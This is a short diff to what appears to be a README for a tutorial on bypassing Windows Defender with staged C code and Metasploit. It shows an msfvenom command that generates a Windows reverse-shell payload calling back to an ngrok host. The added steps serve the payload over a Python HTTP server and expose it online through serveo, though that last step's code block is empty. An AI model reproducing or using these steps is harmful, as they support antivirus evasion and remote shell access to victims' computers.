@@ -34,3 +34,14 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
   ```
    - msfvenom -p windows/x64/shell_reverse_tcp LHOST=4.tcp.eu.ngrok.io LPORT=15819 -f raw -o payload.bin
   ```
+
+- Launch a Python HTTP server in the same directory where the payload is located -
+  ```
+   - python -m http.server 8090
+  ```
+
+  - Expose Server Online using serveo -
+  ```
+   -
+   -
+  ```
